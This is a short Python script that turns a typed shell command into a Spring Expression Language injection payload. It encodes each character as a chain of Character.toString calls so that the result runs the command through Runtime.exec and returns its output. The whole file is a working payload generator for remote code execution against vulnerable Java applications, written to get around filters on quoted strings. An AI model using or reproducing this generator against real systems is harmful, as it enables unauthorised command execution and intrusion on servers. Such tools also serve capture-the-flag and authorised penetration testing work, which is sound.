
command = input("Enter your command: \n")
print("\nConverting your command:", command)

x = len(command)
formula = "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec"

formula += "(T(java.lang.Character).toString(" + str(ord(command[0])) + ").concat"

for element in range(1, len(command)):
    s = ord(command[element])
    formula += "(T(java.lang.Character).toString(" + str(s) + ")).concat"

size = len(formula)
modform = formula[:size - 7] + ").getInputStream())}"
print("\n"+ modform)
